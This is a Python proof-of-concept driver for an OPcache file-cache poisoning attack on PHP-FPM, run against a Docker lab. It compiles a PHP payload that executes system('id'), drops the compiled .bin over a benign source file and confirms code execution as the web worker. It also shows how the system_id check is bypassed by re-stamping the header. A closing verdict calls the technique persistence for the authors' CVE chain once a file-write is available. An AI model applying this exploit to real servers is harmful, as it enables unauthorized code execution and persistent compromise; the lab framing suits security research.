#!/usr/bin/env python3
"""Driver for opcache_filecache_poison.py: end-to-end proof of the OPcache
file-cache poisoning chain against a lab with a world-writable file_cache. Uses
``docker compose exec`` as the write stand-in, then phases: A poison+execute
(payload .bin runs uid=33 over a benign source), B system_id gate (re-stamp ->
rejected), C checksum gate (body flip -> rejected), D self-checks.

Bring up the lab:
    docker compose -f docker-compose.fpm-avenues.yml -p p2s-opcache --profile opcache up -d --build
    python3 -I poc/routes/verify_opcache_filecache_poison.py --port 8142
"""

import argparse
import os
import subprocess
import sys
import time
import urllib.request

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
import opcache_filecache_poison as ofc  # noqa: E402

DEFAULT_COMPOSE = os.path.join(os.path.dirname(os.path.dirname(HERE)), "docker-compose.fpm-avenues.yml")
SERVICE = "opcache-fpm"
FILE_CACHE = "/var/opcache"
SCRIPT = "/var/www/html/index.php"

PAYLOAD_SRC = '<?php echo "AV3_START:"; system("id"); echo ":AV3_END";'
BENIGN_SRC = '<?php echo "PURE_BENIGN_SOURCE_NO_EXEC";'
PAYLOAD_MARK = "AV3_START:"
BENIGN_MARK = "PURE_BENIGN_SOURCE_NO_EXEC"


class Lab:
    def __init__(self, compose, port):
        self.compose = compose
        self.port = port

    def _compose(self, *args, **kw):
        return subprocess.run(
            ["docker", "compose", "-f", self.compose,
             "-p", "p2s-opcache", "--profile", "opcache", *args],
            capture_output=True, **kw)

    def exec_sh(self, script, stdin=None):
        """Run `bash -c script` in the fpm container; return (rc, stdout bytes)."""
        r = self._compose("exec", "-T", SERVICE, "bash", "-c", script, input=stdin)
        return r.returncode, r.stdout

    def read_file(self, path):
        r = self._compose("exec", "-T", SERVICE, "cat", path)
        return r.stdout if r.returncode == 0 else None

    def write_file(self, path, data):
        """The file-WRITE stand-in: place `data` bytes at `path` in the cache
        container (what a real file-write primitive would do over the wire)."""
        rc, _ = self.exec_sh("mkdir -p \"$(dirname '%s')\" && cat > '%s'"
                             % (path, path), stdin=data)
        return rc == 0

    def set_source(self, src):
        self.exec_sh("printf %%s %s > %s" % (_shq(src), SCRIPT))

    def clear_cache(self):
        self.exec_sh("rm -rf %s/* 2>/dev/null" % FILE_CACHE)

    def restart_fpm(self):
        self._compose("restart", SERVICE)
        time.sleep(2)

    def find_bin(self):
        rc, out = self.exec_sh("find %s -type f -name '*.bin' | head -1" % FILE_CACHE)
        p = out.decode().strip()
        return p or None

    def http(self):
        try:
            with urllib.request.urlopen("http://127.0.0.1:%d/index.php" % self.port,
                                        timeout=10) as r:
                return r.read().decode("latin1")
        except Exception as e:  # noqa: BLE001
            return "<http error: %s>" % e


def _shq(s):
    return "'" + s.replace("'", "'\\''") + "'"


def main(argv):
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("--compose", default=DEFAULT_COMPOSE)
    ap.add_argument("--port", type=int, default=8144)
    ap.add_argument("--scratch", default=os.environ.get("TMPDIR", "/tmp"))
    args = ap.parse_args(argv)

    # grouped-compose isolation (Lab._compose inherits os.environ).
    os.environ["COMPOSE_FILE"] = args.compose
    os.environ["COMPOSE_PROJECT_NAME"] = "p2s-opcache"
    os.environ["COMPOSE_PROFILES"] = "opcache"

    lab = Lab(args.compose, args.port)
    results = []

    def check(name, ok, detail=""):
        results.append((name, ok, detail))
        print("[%s] %s%s" % ("+" if ok else "-", name,
                             ("  -- " + detail) if detail else ""))

    print("== Avenue #3: OPcache file_cache poisoning, PHP 8.4.26-fpm ==")
    base = lab.http()
    if "<http error" in base:
        print("lab not reachable on :%d -- `docker compose -f %s -p p2s-opcache "
              "--profile opcache up -d --build`" % (args.port, args.compose))
        return 2
    print("    lab live on :%d (%s)" % (args.port, base.strip()[:60]))

    # --- build a valid payload .bin on the matching build (lab = same box) -----
    # A real attacker compiles the payload on a sibling build; here the lab's own
    # fpm does it: payload source -> request -> fpm writes + runs the payload .bin.
    lab.clear_cache()
    lab.set_source(PAYLOAD_SRC)
    lab.restart_fpm()
    gen = lab.http()
    binpath = lab.find_bin()
    sysid = binpath.split(FILE_CACHE + "/", 1)[1].split("/", 1)[0] if binpath else "?"
    check("build: fpm compiled+ran payload, wrote .bin",
          PAYLOAD_MARK in gen and binpath is not None,
          "system_id=%s path=%s" % (sysid, binpath))

    payload_bin = lab.read_file(binpath)
    local_payload = os.path.join(args.scratch, "av3_payload.bin")
    with open(local_payload, "wb") as fh:
        fh.write(payload_bin)

    # --- D: poc self-checks on the real build's .bin ---------------------------
    b = ofc.load(local_payload)
    check("poc: header parses, magic OK", b.valid_magic(),
          "mem=%d str=%d" % (b.mem_size, b.str_size))
    check("poc: adler32(body) == build's stored checksum", b.checksum_ok(),
          "computed=0x%x stored=0x%x" % (b.computed_checksum(), b.checksum))
    # path derivation matches what fpm used
    derived = ofc.cache_path(FILE_CACHE, b.system_id, SCRIPT)
    check("poc: cache_path() == fpm's real path", derived == binpath,
          derived)

    # --- A: POISON + EXECUTE with a BENIGN source on disk ----------------------
    lab.set_source(BENIGN_SRC)                 # source now benign, bin is payload
    on_disk = (lab.read_file(SCRIPT) or b"").decode("latin1")
    # drop the payload .bin via the write stand-in, fresh worker, request
    lab.write_file(binpath, payload_bin)
    lab.restart_fpm()
    out = lab.http()
    check("A: poisoned .bin executes (uid=33) despite BENIGN source",
          PAYLOAD_MARK in out and "uid=33" in out and BENIGN_MARK in on_disk
          and BENIGN_MARK not in out,
          "source=%r  response=%r" % (on_disk.strip()[:40], out.strip()[:60]))

    # --- B: SYSTEM-ID gate -----------------------------------------------------
    wrong, _ = ofc.poison_bin(local_payload, target_system_id="f" * 32)
    lab.write_file(binpath, wrong)
    lab.restart_fpm()
    out_b = lab.http()
    check("B: wrong header system_id -> .bin rejected (recompiles benign)",
          PAYLOAD_MARK not in out_b and BENIGN_MARK in out_b,
          "response=%r" % out_b.strip()[:60])

    # --- C: CHECKSUM gate ------------------------------------------------------
    bc = ofc.load(local_payload)
    bc.raw[bc.body_start + 16] ^= 0x41         # corrupt body, do NOT refresh csum
    lab.write_file(binpath, bytes(bc.raw))
    lab.restart_fpm()
    out_c = lab.http()
    check("C: corrupt body (bad adler32) -> .bin rejected (consistency_checks)",
          PAYLOAD_MARK not in out_c and BENIGN_MARK in out_c,
          "response=%r" % out_c.strip()[:60])

    # --- re-drop GOOD bin: deterministic re-execution --------------------------
    lab.write_file(binpath, payload_bin)
    lab.restart_fpm()
    out_r = lab.http()
    check("re-drop valid .bin -> executes again (uid=33), deterministic",
          PAYLOAD_MARK in out_r and "uid=33" in out_r)

    # restore benign container source (tidy)
    lab.set_source(BENIGN_SRC)

    print("\n== REACHABILITY VERDICT (the gating question) ==")
    print(_VERDICT)

    npass = sum(1 for _, ok, _ in results if ok)
    print("\n%d/%d checks passed" % (npass, len(results)))
    return 0 if npass == len(results) else 1


_VERDICT = """\
MECHANISM: PROVEN. A valid compiled .bin dropped at
  <file_cache>/<system_id>/<script-realpath>.bin
executes as the fpm worker (uid=33) regardless of the (benign) PHP source, given
file_cache_only=1 + validate_timestamps=0. Gates: magic "OPCACHE", header
system_id == target's zend_system_id, and (if consistency_checks) adler32(body).
The header system_id is NOT covered by the body checksum, so a sibling-built
.bin is re-stamped to the target with no checksum fix.

CAN OUR OWN WRITE PRIMITIVES REACH THE CACHE DIR?  NO -- not on their own.
  * upload-progress session poison (upload_progress_include_race.py): writes
    ONLY to save_path/sess_<sid>. The filename is fixed to 'sess_<sid>' and the
    directory is the session save_path. It cannot choose the cache dir nor the
    '<system_id>/<realpath>.bin' filename. => cannot place a .bin.
  * var_hash_rw arbitrary write (var_hash_rw / the CVE chain): an in-PROCESS MEMORY write
    (write8(addr,qword) into the worker's address space). It does not create or
    write files on disk. To write a .bin it would first need code execution to
    call fwrite/file_put_contents -- which is the very thing we are trying to
    get. => circular; cannot bootstrap from the memory-write alone.
  * pg_persist.py likewise needs an attacker file ALREADY on disk at a readable
    path; it only redirects PG(auto_prepend_file) at it. Same precondition gap.

CONCLUSION: OPcache file-cache poisoning is GATED ON A SEPARATE ARBITRARY FILE-
WRITE primitive (writable cache dir + ability to place bytes at a chosen path).
We do not currently hold one zero-knowledge. It is therefore NOT a bootstrap
RCE for our CVE chain, but a strong PERSISTENCE / lateral technique the moment a
file-write (misconfig, a co-located upload-to-arbitrary-path bug, a shared
world-writable file_cache, or post-exploitation) is available: craft the .bin
offline on a matching build, re-stamp the system_id, drop it, done. It also
needs file_cache configured (not a stock default) and, for a durable drop, a
fresh worker / no in-process copy of that script.
"""

if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))
